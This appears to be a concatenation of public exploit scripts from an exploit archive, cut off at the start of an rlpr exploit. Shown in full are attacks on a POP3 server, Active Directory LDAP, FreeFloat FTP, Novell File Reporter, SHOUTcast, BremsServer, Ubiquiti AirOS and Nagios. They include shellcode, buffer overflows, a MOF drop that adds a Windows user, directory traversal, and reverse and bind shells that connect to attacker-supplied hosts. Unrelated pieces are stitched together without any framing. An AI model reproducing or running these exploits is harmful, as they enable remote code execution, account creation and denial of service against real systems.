egghunter +="\x43\xeb\xed\xe8\xda\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8"
egghunter +="\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x33\xc0\xc3"

# win32_bind -  EXITFUNC=seh LPORT=4444 Size=709 Encoder=PexAlphaNum

shellcode  ="\x90\x90\x74\x30\x30\x77\x74\x30\x30\x77" # t00wt00w (!)
shellcode +="\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
shellcode +="\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
shellcode +="\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
shellcode +="\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
shellcode +="\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x56\x4b\x4e"
shellcode +="\x4d\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x36\x4b\x38"
shellcode +="\x4e\x46\x46\x52\x46\x42\x4b\x48\x45\x34\x4e\x53\x4b\x48\x4e\x57"
shellcode +="\x45\x50\x4a\x47\x41\x50\x4f\x4e\x4b\x58\x4f\x54\x4a\x41\x4b\x48"
shellcode +="\x4f\x45\x42\x52\x41\x30\x4b\x4e\x49\x34\x4b\x58\x46\x33\x4b\x48"
shellcode +="\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x38\x42\x4c"
shellcode +="\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
shellcode +="\x46\x4f\x4b\x53\x46\x45\x46\x32\x4a\x52\x45\x37\x45\x4e\x4b\x38"
shellcode +="\x4f\x35\x46\x52\x41\x30\x4b\x4e\x48\x36\x4b\x58\x4e\x30\x4b\x54"
shellcode +="\x4b\x58\x4f\x45\x4e\x31\x41\x50\x4b\x4e\x43\x50\x4e\x42\x4b\x38"
shellcode +="\x49\x58\x4e\x46\x46\x52\x4e\x31\x41\x46\x43\x4c\x41\x53\x4b\x4d"
shellcode +="\x46\x56\x4b\x58\x43\x44\x42\x33\x4b\x48\x42\x54\x4e\x30\x4b\x38"
shellcode +="\x42\x57\x4e\x51\x4d\x4a\x4b\x58\x42\x54\x4a\x50\x50\x45\x4a\x46"
shellcode +="\x50\x48\x50\x34\x50\x30\x4e\x4e\x42\x35\x4f\x4f\x48\x4d\x48\x56"
shellcode +="\x43\x35\x48\x46\x4a\x56\x43\x43\x44\x43\x4a\x36\x47\x47\x43\x57"
shellcode +="\x44\x33\x4f\x45\x46\x45\x4f\x4f\x42\x4d\x4a\x46\x4b\x4c\x4d\x4e"
shellcode +="\x4e\x4f\x4b\x53\x42\x55\x4f\x4f\x48\x4d\x4f\x55\x49\x38\x45\x4e"
shellcode +="\x48\x36\x41\x58\x4d\x4e\x4a\x30\x44\x30\x45\x55\x4c\x36\x44\x50"
shellcode +="\x4f\x4f\x42\x4d\x4a\x46\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x55"
shellcode +="\x4f\x4f\x48\x4d\x43\x45\x43\x55\x43\x45\x43\x35\x43\x55\x43\x34"
shellcode +="\x43\x45\x43\x44\x43\x45\x4f\x4f\x42\x4d\x48\x36\x4a\x56\x41\x51"
shellcode +="\x4e\x35\x48\x46\x43\x35\x49\x38\x41\x4e\x45\x39\x4a\x46\x46\x4a"
shellcode +="\x4c\x51\x42\x37\x47\x4c\x47\x35\x4f\x4f\x48\x4d\x4c\x36\x42\x51"
shellcode +="\x41\x35\x45\x55\x4f\x4f\x42\x4d\x4a\x56\x46\x4a\x4d\x4a\x50\x42"
shellcode +="\x49\x4e\x47\x35\x4f\x4f\x48\x4d\x43\x35\x45\x55\x4f\x4f\x42\x4d"
shellcode +="\x4a\x46\x45\x4e\x49\x44\x48\x48\x49\x34\x47\x55\x4f\x4f\x48\x4d"
shellcode +="\x42\x35\x46\x35\x46\x35\x45\x45\x4f\x4f\x42\x4d\x43\x49\x4a\x56"
shellcode +="\x47\x4e\x49\x57\x48\x4c\x49\x47\x47\x55\x4f\x4f\x48\x4d\x45\x45"
shellcode +="\x4f\x4f\x42\x4d\x48\x56\x4c\x56\x46\x56\x48\x56\x4a\x46\x43\x46"
shellcode +="\x4d\x46\x49\x38\x45\x4e\x4c\x46\x42\x55\x49\x55\x49\x32\x4e\x4c"
shellcode +="\x49\x38\x47\x4e\x4c\x36\x46\x34\x49\x58\x44\x4e\x41\x33\x42\x4c"
shellcode +="\x43\x4f\x4c\x4a\x50\x4f\x44\x34\x4d\x52\x50\x4f\x44\x34\x4e\x42"
shellcode +="\x43\x59\x4d\x58\x4c\x57\x4a\x53\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x56"
shellcode +="\x44\x37\x50\x4f\x43\x4b\x48\x51\x4f\x4f\x45\x47\x46\x44\x4f\x4f"
shellcode +="\x48\x4d\x4b\x35\x47\x45\x44\x55\x41\x55\x41\x55\x41\x55\x4c\x56"
shellcode +="\x41\x50\x41\x45\x41\x35\x45\x45\x41\x55\x4f\x4f\x42\x4d\x4a\x56"
shellcode +="\x4d\x4a\x49\x4d\x45\x50\x50\x4c\x43\x45\x4f\x4f\x48\x4d\x4c\x46"
shellcode +="\x4f\x4f\x4f\x4f\x47\x43\x4f\x4f\x42\x4d\x4b\x58\x47\x55\x4e\x4f"
shellcode +="\x43\x38\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x35\x4f\x4f\x42\x4d"
shellcode +="\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x35\x43\x55\x4f\x4f\x48\x4d"
shellcode +="\x4f\x4f\x42\x4d\x5a"

buffer ="AAA"+tap+"BBBB"+ret+ueh+"\x90"*90 +egghunter+"C"*346

for x in range(5):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,110))
	data=s.recv(1024)
	print data
	s.send('USER '+'@A' * 1600 + '\x90'*5945 + shellcode +'D'*3711 + '\r\n') 
	s.send('QUIT\r\n')
	s.close()
	sleep(1)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,110))
data=s.recv(1024)
print data
s.send('USER ' + '@A@A'+ buffer + '\r\n')
data=s.recv(1024)
print data
s.send('USER ' + 'A' * 3370 + '\r\n')
s.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,110))
data=s.recv(1024)
print data
s.send('USER ' + '@A@A'+ buffer + '\r\n')
data=s.recv(1024)
print data
s.send('USER ' + 'A' * 3370 + '\r\n')
s.close()
sleep(1)

# milw0rm.com [2006-08-26]
source: http://www.securityfocus.com/bid/7930/info

A vulnerability has been discovered in Microsoft Windows 2000. The problem occurs in the Active Directory component and will result in a denial of service.

An unauthenticated attacker could exploit this vulnerability by transmitting a malformed LDAP version 3 request to a target Microsoft Windows 2000 server. When the request is processed, an exception will be triggered effectively causing the target server to crash.

An affected system is said to reboot within 30 seconds of the exception being triggered.

class ActiveDirectoryDOS( Ldap ):

    def __init__(self):
        self._s = None
        self.host = '192.168.0.1'
        self.basedn = 'dc=bugweek,dc=corelabs,dc=core-sdi,dc=com'
        self.port = 389
        self.buffer = ''
        self.msg_id = 1
        Ldap.__init__()

    def generateFilter_BinaryOp( self, filter ):
        filterBuffer = asn1.OCTETSTRING(filter[1]).encode() + asn1.OCTETSTRING(filter[2]).encode()
        filterBuffer = self.encapsulateHeader( filter[0], filterBuffer )
        return filterBuffer        
    
    def generateFilter_RecursiveBinaryOp( self, filter, numTimes):
        simpleBinOp = self.generateFilter_BinaryOp( filter )
        filterBuffer = simpleBinOp
        for cnt in range( 0, numTimes ):
            filterBuffer = self.encapsulateHeader( self.LDAP_FILTER_AND, filterBuffer + simpleBinOp )
        return filterBuffer


    def searchSub( self, filterBuffer ):

        self.bindRequest()
        self.searchRequest( filterBuffer )

    def run(self, host = '', basedn = '', name = '' ):
        
        # the machine must not exist
        machine_name = 'xaxax'
        
        filterComputerNotInDir = (Ldap.LDAP_FILTER_EQUALITY,'name',machine_name)

        # execute the anonymous query
        print 'executing query'
        filterBuffer = self.generateFilter_RecursiveBinaryOp( filterComputerNotInDir, 7000 )
        self.searchSub( filterBuffer )
#Exploit title: FreeFloat FTP Server Remote Command Execution USER Command Buffer Overflow
#Date: 06/12/2012
#Exploit Author: D35m0nd142
#Vendor Homepage: http://www.freefoat.com
#Tested on Windows XP SP3 with Ubuntu 12.04
#!/usr/bin/python
import socket,sys,time,os
import Tkinter,tkMessageBox
os.system("clear")
def exploit():
	target = ip.get()
	junk = "\x41" * 230     # Offest Number --> 230
	eip = "\x53\x93\x37\x7E"  # 0x7E379353   FFE4             JMP ESP
	nops = "\x90" * 20
	payload =("\xb8\xe9\x78\x9d\xdb\xda\xd2\xd9\x74\x24\xf4\x5e\x2b\xc9" +
	"\xb1\x4f\x31\x46\x14\x83\xc6\x04\x03\x46\x10\x0b\x8d\x61" +
	"\x33\x42\x6e\x9a\xc4\x34\xe6\x7f\xf5\x66\x9c\xf4\xa4\xb6" +
	"\xd6\x59\x45\x3d\xba\x49\xde\x33\x13\x7d\x57\xf9\x45\xb0" +
	"\x68\xcc\x49\x1e\xaa\x4f\x36\x5d\xff\xaf\x07\xae\xf2\xae" +	
	"\x40\xd3\xfd\xe2\x19\x9f\xac\x12\x2d\xdd\x6c\x13\xe1\x69" +
	"\xcc\x6b\x84\xae\xb9\xc1\x87\xfe\x12\x5e\xcf\xe6\x19\x38" +
	"\xf0\x17\xcd\x5b\xcc\x5e\x7a\xaf\xa6\x60\xaa\xfe\x47\x53" +
	"\x92\xac\x79\x5b\x1f\xad\xbe\x5c\xc0\xd8\xb4\x9e\x7d\xda" +
	"\x0e\xdc\x59\x6f\x93\x46\x29\xd7\x77\x76\xfe\x81\xfc\x74" +	
	"\x4b\xc6\x5b\x99\x4a\x0b\xd0\xa5\xc7\xaa\x37\x2c\x93\x88" +
	"\x93\x74\x47\xb1\x82\xd0\x26\xce\xd5\xbd\x97\x6a\x9d\x2c" +
	"\xc3\x0c\xfc\x38\x20\x22\xff\xb8\x2e\x35\x8c\x8a\xf1\xed" +
	"\x1a\xa7\x7a\x2b\xdc\xc8\x50\x8b\x72\x37\x5b\xeb\x5b\xfc" +
	"\x0f\xbb\xf3\xd5\x2f\x50\x04\xd9\xe5\xf6\x54\x75\x56\xb6" +	
	"\x04\x35\x06\x5e\x4f\xba\x79\x7e\x70\x10\x0c\xb9\xe7\x5b" +
	"\xa7\x44\x78\x33\xba\x46\x69\x98\x33\xa0\xe3\x30\x12\x7b" +
	"\x9c\xa9\x3f\xf7\x3d\x35\xea\x9f\xde\xa4\x71\x5f\xa8\xd4" +
	"\x2d\x08\xfd\x2b\x24\xdc\x13\x15\x9e\xc2\xe9\xc3\xd9\x46" +
	"\x36\x30\xe7\x47\xbb\x0c\xc3\x57\x05\x8c\x4f\x03\xd9\xdb" +
	"\x19\xfd\x9f\xb5\xeb\x57\x76\x69\xa2\x3f\x0f\x41\x75\x39" +
	"\x10\x8c\x03\xa5\xa1\x79\x52\xda\x0e\xee\x52\xa3\x72\x8e" +
	"\x9d\x7e\x37\xbe\xd7\x22\x1e\x57\xbe\xb7\x22\x3a\x41\x62" +
	"\x60\x43\xc2\x86\x19\xb0\xda\xe3\x1c\xfc\x5c\x18\x6d\x6d" +
	"\x09\x1e\xc2\x8e\x18")
	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

	try:
		sock.connect((target,21))
		print "\n\n[-] Sending exploit ..."
		print sock.recv(2000)
		sock.send("USER "+junk+eip+nops+payload+"\r\n")
		sock.close()
		os.system("nc -lvp 4444")
	except:
		print "[-] Connection to "+target+" failed! \n"
		sys.exit(0)


root=Tkinter.Tk()
root.geometry("%dx%d" %(700,375))
root.title("*** FreeFloat FTP Server Remote Code Execution USER Command Buffer Overflow***")
root['bg'] = 'black'
developer=Tkinter.Label(text="Developed by D35m0nd142").pack(side='bottom')
ip_answer=Tkinter.Label(text="IP Address ").pack()
ip=Tkinter.StringVar()
ip_entry=Tkinter.Entry(textvariable=ip).pack()
exploit=Tkinter.Button(text="Exploit",command=exploit).pack()
root.mainloop()
# wwww.abysssec.com
# Novell File Reporter Agent XML Parsing Remote Code Execution Vulnerability (0day)
# CVE-2012-4959
# @abysssec
# well just one more of our 0day got published after ~2 year 
# here is info : https://community.rapid7.com/community/metasploit/blog/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959
# and here is our exploit 

import httplib, md5, sys

def message_MD5(arg):
	v = "SRS" + arg + "SERVER"
	m = md5.new(v)
	return m.hexdigest()

def genMof(command="net user abysssec 123456 /add"):		
	
	vbs = ""
	vbs += "\"Set objShell = CreateObject(\\\"WScript.Shell\\\")\\n\"\n"
	vbs += "\"objShell.Run \\\"cmd.exe /C "
	vbs += command
	vbs += "\\\"\""


	mof = """
	#pragma namespace ("\\\\\\\\.\\\\root\\\\subscription")
	#pragma deleteclass("MyASEventConsumer", nofail)
	#pragma deleteinstance("__EventFilter.Name=\\\"EF\\\"", nofail)
	#pragma deleteinstance("ActiveScriptEventConsumer.Name=\\\"ASEC\\\"", nofail)

	class MyASEventConsumer
	{
		[key]string Name;
	};

	instance of ActiveScriptEventConsumer as $CONSUMER
	{
		CreatorSID = {1,2,0,0,0,0,0,5,32,0,0,0,32,2,0,0};
		Name = "ASEC";
		ScriptingEngine = "VBScript";    
		ScriptText =
	SCRIPT;
	};

	instance of __EventFilter as $FILTER
	{
		CreatorSID = {1,2,0,0,0,0,0,5,32,0,0,0,32,2,0,0};
		Name = "EF";
		Query = "SELECT * FROM __InstanceCreationEvent"
			" WHERE TargetInstance.__class = \\"MyASEventConsumer\\"";
		QueryLanguage = "WQL";
	};

	instance of __FilterToConsumerBinding as $BINDING
	{
		CreatorSID = {1,2,0,0,0,0,0,5,32,0,0,0,32,2,0,0};
		Filter = $FILTER;
		Consumer = $CONSUMER;
	};

	instance of MyASEventConsumer
	{
		 Name = "Trigger";
	};
	""".replace('SCRIPT',vbs)

	return mof

def main(argv=None):
	if argv is None:
		argv = sys.argv
	
	if len(argv) != 2:
		print "[!] USAGE : mof \"<command]>\""
		return
	
	msg = "<ROOT><NAME>FSFUI</NAME><UICMD>130</UICMD><TOKEN><FILE>../../../../../../Windows/system32/wbem/mof/command.mof</FILE></TOKEN><![CDATA["
	msg += genMof(argv[1] + "> C:/Windows/System32/info.dat")
	msg += "]]></ROOT>" 
	body = message_MD5(msg).upper() + msg
	headers = {"Content-type": "text/xml"}
	
	conn = httplib.HTTPSConnection("192.168.10.20:3037")			
	conn.request("POST", "/SRS/CMD",body, headers)
	response = conn.getresponse()
	print "\n...Command Executed ..."
	print response.status, response.reason
	
	print response.read()
	
	msg = "<ROOT><NAME>FSFUI</NAME><UICMD>126</UICMD><TOKEN><FILE>../../../../../../WINDOWS/system32/info.dat</FILE></TOKEN></ROOT>"
	body = message_MD5(msg).upper() + msg
	conn.request("POST", "/SRS/CMD",body, headers)
	response = conn.getresponse()
	conn.request("POST", "/SRS/CMD",body, headers)
	response = conn.getresponse()
	print "\n...Getting result ..."
	print response.status, response.reason	
	print response.read()
	
	
	conn.close()


if __name__ == "__main__":
    main()
source: http://www.securityfocus.com/bid/8954/info

Nullsoft SHOUTcast Server is prone to a memory corruption vulnerability that may lead to denial of service attacks or code execution. This is due to insufficient bounds checking of server commands supplied by authenticated users, specifically icy-name and icy-url.

This issue was reported in SHOUTcast 1.9.2 on Windows platforms. Other versions and platforms may also be affected.

#test under gentoo linux ,exec it python shoutexp.py 192.168.0.1
#code by airsupply_at_0x557.org
#thx all sst members

import socket,string,base64
import sys
import telnetlib
import time
t_ip=sys.argv[1]
print t_ip
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((t_ip,8001))
except:
    sys.exit(-1)
########send get ip req####### 
s.send('changeme')
s.send('\r\n');
data=s.recv(1024)
print data
nop='\x90'

shellcode ='\x31\xc0'+\
'\x50'+\
'\x40'+\
'\x89\xc3'+\
'\x50'+\
'\x40'+\
'\x50'+\
'\x89\xe1'+\
'\xb0\x66'+\
'\xcd\x80'+\
'\x31\xd2'+\
'\x52'+\
'\x66\x68\x13\xd2'+\
'\x43'+\
'\x66\x53'+\
'\x89\xe1'+\
'\x6a\x10'+\
'\x51'+\
'\x50'+\
'\x89\xe1'+\
'\xb0\x66'+\
'\xcd\x80'+\
'\x40'+\
'\x89\x44\x24\x04'+\
'\x43'+\
'\x43'+\
'\xb0\x66'+\
'\xcd\x80'+\
'\x83\xc4\x0c'+\
'\x52'+\
'\x52'+\
'\x43'+\
'\xb0\x66'+\
'\xcd\x80'+\
'\x93'+\
'\x89\xd1'+\
'\xb0\x3f'+\
'\xcd\x80'+\
'\x41'+\
'\x80\xf9\x03'+\
'\x75\xf6'+\
'\x52'+\
'\x68\x6e\x2f\x73\x68'+\
'\x68\x2f\x2f\x62\x69'+\
'\x89\xe3'+\
'\x52'+\
'\x53'+\
'\x89\xe1'+\
'\xb0\x0b'+\
'\xcd\x80';
eax='\xe3\xd0\x06\x08';
ret='\x50\xd0\x06\x08';
icy_name='icy-name:'+nop*50+shellcode+nop*(141-len(shellcode))+ret+nop*4+eax+nop*105+eax+nop*200;
will_send= 'icy-genre:DoS radio\r\n'+\
           'icy-url:aaa\r\n'+\
           'icy-pub:1\r\n'+\
           'icy-irc:N/A\r\n'+\
           'icy-icq:N/A\r\n'+\
           'icy-aim:N/A\r\n'+\
           'icy-br:160'+\
           '\r\n'
           

s.send(will_send);
print 'send icy-name\n'
s.send(icy_name);
s.close()
time.sleep(1)
try:
    s2=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s2.connect((t_ip,5074))
except:
    print "s2 fuck out\n"
    sys.exit(-1)
s2.send("unset HISTFILE;id;\n");
recvdata=s2.recv(100);
print recvdata
t=telnetlib.Telnet();
t.sock=s2;
t.interact();
sys.exit(-1);source: http://www.securityfocus.com/bid/9493/info

Herberlin BremsServer is prone to a directory-traversal vulnerability. An attacker may exploit this issue to gain access to files residing outside the web server root directory of the affected system. This issue exists due to a failure to validate user specified URI input.

BremsServer 3.0 is vulnerable; other versions may also be affected.

# --PoC--

import socket

host = 'localhost'
port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.settimeout(8)    

s.send('GET /' + '../' * 16 + 'windows/win.ini HTTP/1.1\r\n'
       'Host: localhost\r\n\r\n')

print s.recv(8192)#!/usr/bin/python
#+--------------------------------------------------------------------------------------------------------------------------------+
# Exploit Title     : Ubiquiti AirOS <= 5.5.2 Remote POST-Auth Root Command Execution
# Date              : 12-28-2012
# Author            : xistence (xistence<[AT]>0x90.nl)
# Software link     : http://www.ubnt.com/eula/?BACK=/downloads/XM-v5.5.2.build14175.bin
# Vendor site       : http://www.ubnt.com/
# Version           : 5.5.2 and lower
# Tested on         : PicoStation M2 (hardware)
#
# Vulnerability     : The http://<IP>/test.cgi "essid" parameter is not sanitized for input which allows for execution of operating
#                     system commands. The parameter input field can be like this to create a file /tmp/test.txt:
#                     "LINKTEST & /bin/touch /tmp/test.txt #"
#		      Authentication to the web site is necessary to exploit this vulnerability. 
#+--------------------------------------------------------------------------------------------------------------------------------+


import urllib, urllib2, cookielib, sys, random, mimetools, mimetypes, itertools, time


print ""
print "[*] Ubiquiti AirOS <= 5.5.2 Remote POST-Auth Root Command Execution - xistence (xistence<[at]>0x90.nl) - 2012-12-28"
print ""
if (len(sys.argv) != 4):
    print "[*] Usage: " + sys.argv[0] + " <rhost> <lhost> <lport>"
    print ""
    exit(0)


rhost = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]
webUser = "ubnt"
webPass = "ubnt"

# Create a random file with 8 characters
filename = ''
for i in random.sample('abcdefghijklmnopqrstuvwxyz1234567890',8):
    filename+=i
filename +=".sh"

shellCmd = '& echo "mknod /tmp/backpipe p ; telnet ' + lhost + ' ' + lport + ' 0</tmp/backpipe | /bin/sh -C 1>/tmp/backpipe 2>/tmp/backpipe ; rm -rf /tmp/backpipe ; rm -rf /tmp/' + filename + '" > /tmp/' + filename + ' ; chmod +x /tmp/' + filename + ' ; /bin/sh /tmp/' + filename + ' #'



class MultiPartForm(object):
    """Accumulate the data to be used when posting a form."""

    def __init__(self):
        self.form_fields = []
        self.files = []
        self.boundary = mimetools.choose_boundary()
        return

    def get_content_type(self):
        return 'multipart/form-data; boundary=%s' % self.boundary

    def add_field(self, name, value):
        """Add a simple field to the form data."""
        self.form_fields.append( ( name, value ) )
        return
   
    def __str__(self):
        """Return a string representing the form data, including attached files."""
        # Build a list of lists, each containing "lines" of the
        # request.  Each part is separated by a boundary string.
        # Once the list is built, return a string where each
        # line is separated by '\r\n'.
        parts = []
        part_boundary = '--' + self.boundary

        # Add the form fields
        parts.extend(
            [ part_boundary,
              'Content-Disposition: form-data; name="%s"' % name,
              '',
              value,
            ]
            for name, value in self.form_fields
            )

        # Flatten the list and add closing boundary marker,
        # then return CR+LF separated data
        flattened = list( itertools.chain( *parts) )
        flattened.append( '--' + self.boundary + '--' )
        flattened.append( '' )
        return '\r\n'.join( flattened )



# Create the form with simple fields
form = MultiPartForm()
form.add_field( 'uri', '' )
form.add_field( 'username', webUser )
form.add_field( 'password', webPass )

form2 = MultiPartForm()
form2.add_field( 'essid', 'LINKTEST ' + shellCmd )
form2.add_field( 'channel', '2412' )
form2.add_field( 'rssithresh', '13' )
form2.add_field( 'file_url', '' )
form2.add_field( 'action', 'test' )
 
# Our Cookie Jar
cj = cookielib.CookieJar()
opener = urllib2.build_opener( urllib2.HTTPCookieProcessor( cj ) )

# Just open the default url to grab the cookies and put them in the jar
print "[+] Opening default page [http://%s] to store cookies" % rhost
resp = opener.open( "http://%s" %rhost )

# Create our multi-part body + headers login POST request
print "[+] Logging in with user [%s] and password [%s] at host [%s]" % ( webUser, webPass, rhost )
resp = urllib2.Request( "http://%s/login.cgi" % rhost )
body = str( form )
resp.add_header( 'Content-type', form.get_content_type() )
resp.add_header( 'Content-length', len( body ) )
resp.add_data( body )
request = opener.open( resp ).read()

# Create our multi-part body + headers command execution POST request
print "[+] Executing reverse shell commands [file = /tmp/" + filename + "], this might take up to a minute before a response is received in your netcat shell"
resp = urllib2.Request( "http://%s/test.cgi" % rhost )
body = str( form2 )
resp.add_header( 'Content-type', form2.get_content_type() )
resp.add_header( 'Content-length', len( body ) )
resp.add_data( body )
request = opener.open( resp ).read()


time.sleep(30)
print "[+] Done, check your netcat reverse shell on ip [%s] port [%s]" % ( lhost, lport )


#!/usr/bin/python
#
# CVE-2012-6096 - Nagios history.cgi Remote Command Execution
# ===========================================================
# Another year, another reincarnation of classic and trivial
# bugs to exploit. This time we attack Nagios.. or more 
# specifically, one of its CGI scripts. [1]
#
# The Nagios code is an amazing monster. It reminds me a
# lot of some of my early experiments in C, back when I 
# still had no clue what I was doing. (Ok, fair enough,
# I still don't, heheh.)
#
# Ok, I'll come clean. This exploit doesn't exactly
# defeat FORTIFY. This approach is likely to work just FINE 
# on other crippled distro's though, think of stuff like 
# ArchLinux, Slackware, and all those Gentoo kids twiddling 
# their CFLAGS. [2] (Oh and hey, BSD and stuff!)
#
# I do some very stupid shit(tm) here that might make an 
# exploit coder or two cringe. My sincere apologies for that.
#
# Cold beer goes out to my friends who are still practicing
# this dying but interesting type of art:
#
#   * brainsmoke * masc * iZsh * skier_ * steve *
#
# -- blasty <blasty@fail0verflow.com> / 2013-01-08
#
# References:
# [1] http://permalink.gmane.org/gmane.comp.security.oss.general/9109
# [2] http://www.funroll-loops.info/
#
# P.S. To the clown who rebranded my Samba exploit: j00 s0 1337 m4n!
# Next time you rebrand an exploit at least show some diligence and
# add some additional targets or improvements, so we can all profit!
#
# P.P.S. hey, Im not _burning_ bugs .. this is a 2day, enjoy!
#

import os, sys, socket, struct, urllib, threading, SocketServer, time
from base64 import b64encode

SocketServer.TCPServer.allow_reuse_address = True

targets = [
	{
		"name"	     : "Debian (nagios3_3.0.6-4~lenny2_i386.deb)",
		"smash_len"  : 0xc37,
		"unescape"   : 0x0804b620,
		"popret"     : 0x08048fe4,
		"hostbuf"    : 0x080727a0,
		"system_plt" : 0x08048c7c
	}
]

def u32h(v):
	return struct.pack("<L", v).encode('hex')

def u32(v, hex = False):
	return struct.pack("<L", v)

# Tiny ELF stub based on:
# http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html 
def make_elf(sc):
	elf_head = \
		"7f454c46010101000000000000000000" + \
		"02000300010000005480040834000000" + \
		"00000000000000003400200001000000" + \
		"00000000010000000000000000800408" + \
		"00800408" + u32h(0x54+len(sc))*2  + \
		"0500000000100000"

	return elf_head.decode("hex") + sc

# interactive connectback listener
class connectback_shell(SocketServer.BaseRequestHandler):
	def handle(self):
		print "\n[!!] K4P0W!@# -> shell from %s" % self.client_address[0]
		print "[**] This shell is powered by insane amounts of illegal substances"
 
		s = self.request
 
		import termios, tty, select, os
		old_settings = termios.tcgetattr(0)

		try:
			tty.setcbreak(0)
			c = True

			os.write(s.fileno(), "id\nuname -a\n")

			while c:
				for i in select.select([0, s.fileno()], [], [], 0)[0]:
					c = os.read(i, 1024)
					if c:
						if i == 0:
							os.write(1, c)
 
						os.write(s.fileno() if i == 0 else 1, c)
		except KeyboardInterrupt: pass
		finally: termios.tcsetattr(0, termios.TCSADRAIN, old_settings)
 
		return
 
class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
	pass

if len(sys.argv) != 5:
	print "\n  >> Nagios 3.x CGI remote code execution by <blasty@fail0verflow.com>"
	print "  >> \"Jetzt geht's Nagi-los!\"\n"
	print "  usage: %s <base_uri> <myip> <myport> <target>\n" % (sys.argv[0])
	print "  targets:"

	i = 0

	for target in targets:
		print "	%02d) %s" % (i, target['name'])
		i = i+1
 
	print ""
	sys.exit(-1)

target_no = int(sys.argv[4])

if target_no < 0 or target_no > len(targets):
	print "Invalid target specified"
	sys.exit(-1)

target = targets[ int(sys.argv[4]) ]

# comment this shit if you want to setup your own listener
server = ThreadedTCPServer((sys.argv[2], int(sys.argv[3])), connectback_shell)
server_thread = threading.Thread(target=server.serve_forever)
server_thread.daemon = True
server_thread.start()

# shellcode to be executed
# vanilla x86/linux connectback written by a dutch gentleman
# close to a decade ago.
cback = \
	"31c031db31c951b10651b10151b10251" + \
	"89e1b301b066cd8089c231c031c95151" + \
	"68badc0ded6668b0efb102665189e7b3" + \
	"1053575289e1b303b066cd8031c939c1" + \
	"740631c0b001cd8031c0b03f89d3cd80" + \
	"31c0b03f89d3b101cd8031c0b03f89d3" + \
	"b102cd8031c031d250686e2f7368682f" + \
	"2f626989e3505389e1b00bcd8031c0b0" + \
	"01cd80"

cback = cback.replace("badc0ded", socket.inet_aton(sys.argv[2]).encode("hex"))
cback = cback.replace("b0ef", struct.pack(">H", int(sys.argv[3])).encode("hex")) 

# Eww.. so there's some characters that dont survive the trip..
# yes, even with the unescape() call in our return-chain..
# initially I was going to use some /dev/tcp based connectback..
# but /dev/tcp isn't available/accesible everywhere, so instead
# we drop an ELF into /tmp and execute that. The '>' characters
# also doesn't survive the trip so we work around this by using
# the tee(1) utility.
# If your target has a /tmp that is mounted with noexec flag,
# is severely firewalled or guarded by trained (watch)dogs..
# you might want to reconsider this approach!
cmd  = \
	"rm -rf /tmp/x;" + \
	"echo " + b64encode(make_elf(cback.decode('hex'))) + "|" + \
	"base64 -d|tee /tmp/x|chmod +x /tmp/x;/tmp/x;"

# Spaces (0x20) are also a problem, they always ends up as '+' :-(
# so apply some olde trick and rely on $IFS for argv separation
cmd = cmd.replace(" ", "${IFS}")

# Basic return-2-whatever/ROP chain.
# We return into cgi_input_unescape() to get rid of
# URL escaping in a static buffer we control, and then
# we return into system@plt for the moneyshot.
#
# Ergo sum:
# There's no memoryleak or whatever needed to leak libc
# base and bypass ASLR.. This entire Nagios PoS is stringed
# together by system() calls, so pretty much every single one 
# of their little silly binaries comes with a PLT entry for
# system(), huzzah!
rop = [
	u32(target['unescape']),
	u32(target['popret']),
	u32(target['hostbuf']),
	u32(target['system_plt']),
	u32(0xdeafbabe),
	u32(target['hostbuf'])
]

# Yes.. urllib, so it supports HTTPS, basic-auth and whatnot
# out of the box. Building HTTP requests from scratch is so 90ies..
params = urllib.urlencode({
	'host' : cmd + "A"*(target['smash_len']-len(cmd)) + "".join(rop)
})

print "[>>] CL1Q .."
f = urllib.urlopen(sys.argv[1]+"/cgi-bin/history.cgi?%s" % params)

print "[>>] CL4Q .."
f.read()

# TRIAL PERIOD ACTIVE, LOL!
time.sleep(0x666)

server.shutdown()source: http://www.securityfocus.com/bid/10578/info

It is reported that rlpr is prone to multiple vulnerabilities. These vulnerabilities can allow a remote attacker to execute arbitrary code in order to gain unauthorized access.

The application is affected by a format string vulnerability. This vulnerability presents itself due to insufficient sanitization of user-supplied data through the 'msg()' function.

The 'msg()' function is also affected by a buffer overflow vulnerability. This issue occurs due to insufficient boundary checking and may also be exploited to gain unauthorized access to a vulnerable computer. 

rlpr versions 2.04 and prior are affected by these issues.

#!/usr/bin/python
import os, sys, socket, struct, time, telnetlib

class rlprd:
	fd = None
	pad = 2 

	#00000000  31DB              xor ebx,ebx
	#00000002  F7E3              mul ebx
	#00000004  B003              mov al,0x3
	#00000006  80C304            add bl,0x4
	#00000009  89E1              mov ecx,esp
	#0000000B  4A                dec edx
	#0000000C  CC                int3
	#0000000D  CD80              int 0x80
	#0000000F  FFE1              jmp ecx
	
	# read(4, esp, -1); jmp ecx
